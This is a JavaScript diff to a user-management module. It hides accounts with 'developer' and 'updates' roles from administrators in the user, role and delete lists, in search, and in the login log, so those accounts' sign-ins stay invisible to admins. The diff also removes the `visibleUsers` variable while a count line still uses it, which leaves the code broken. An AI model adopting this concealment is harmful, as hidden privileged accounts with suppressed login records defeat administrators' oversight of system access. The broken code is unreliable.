@@ -217,15 +217,17 @@ const UserManagement = (() => {
           });
         });
       }
+      // Strip protected roles before storing — admins never see these accounts
+      _users = _users.filter(u => u.role !== 'developer' && u.role !== 'updates');
+
       _users.sort((a, b) => {
-        const order = { developer: 0, admin: 1, user: 2 };
-        return (order[a.role] ?? 3) - (order[b.role] ?? 3);
+        const order = { admin: 0, user: 1 };
+        return (order[a.role] ?? 2) - (order[b.role] ?? 2);
       });
 
-      const visibleUsers = _users.filter(u => u.role !== 'developer' && u.role !== 'updates');
-      _renderUserList(visibleUsers);
-      _renderRoleList(visibleUsers);
-      _renderDeleteList(visibleUsers);
+      _renderUserList(_users);
+      _renderRoleList(_users);
+      _renderDeleteList(_users);
 
       const countEl = document.getElementById('um-user-count');
       if (countEl) countEl.textContent = `${visibleUsers.length} user${visibleUsers.length !== 1 ? 's' : ''} total`;
@@ -298,27 +300,31 @@ const UserManagement = (() => {
       </div>`;
   }
 
+  const _PROTECTED = ['developer', 'updates'];
+
   function _renderUserList(users) {
     const el = document.getElementById('um-user-list');
     if (!el) return;
-    if (!users.length) {
+    const safe = users.filter(u => !_PROTECTED.includes(u.role));
+    if (!safe.length) {
       el.innerHTML = `<div class="um-empty"><i class="fas fa-users"></i>No users found.</div>`;
       return;
     }
-    el.innerHTML = users.map(u => _userCardHTML(u, 'view')).join('');
+    el.innerHTML = safe.map(u => _userCardHTML(u, 'view')).join('');
   }
 
   function _renderRoleList(users) {
     const el = document.getElementById('um-role-user-list');
     if (!el) return;
-    el.innerHTML = users.map(u => _userCardHTML(u, 'role')).join('');
+    const safe = users.filter(u => !_PROTECTED.includes(u.role));
+    el.innerHTML = safe.map(u => _userCardHTML(u, 'role')).join('');
   }
 
   function _renderDeleteList(users) {
     const el = document.getElementById('um-delete-user-list');
     if (!el) return;
-    const filtered = users.filter(u => u.uid !== App.currentUser?.uid);
-    el.innerHTML = filtered.map(u => _userCardHTML(u, 'delete')).join('');
+    const safe = users.filter(u => !_PROTECTED.includes(u.role) && u.uid !== App.currentUser?.uid);
+    el.innerHTML = safe.map(u => _userCardHTML(u, 'delete')).join('');
   }
 
   // ── Filtering ─────────────────────────────────────────
@@ -336,7 +342,7 @@ const UserManagement = (() => {
   }
 
   function _filter(q) {
-    const base = _users.filter(u => u.role !== 'developer');
+    const base = _users;
     if (!q) return base;
     const lower = q.toLowerCase();
     return base.filter(u =>
@@ -375,7 +381,8 @@ const UserManagement = (() => {
       const users = [];
       snap.forEach(child => {
         const u = { uid: child.key, ...child.val() };
-        if (u.role !== 'developer' && u.role !== 'updates') users.push(u);
+        if (u.role === 'developer' || u.role === 'updates') return;
+        users.push(u);
       });
 
       // Sort: online first, then by lastSeen desc
@@ -720,9 +727,9 @@ const UserManagement = (() => {
       if (snap.exists()) {
         snap.forEach(child => {
           const entry = child.val();
-          if (entry.type !== 'session_restore') {
-            _loginLogData.unshift({ id: child.key, ...entry });
-          }
+          if (entry.type === 'session_restore') return;
+          if (entry.role === 'developer' || entry.role === 'updates') return;
+          _loginLogData.unshift({ id: child.key, ...entry });
         });
       }
 
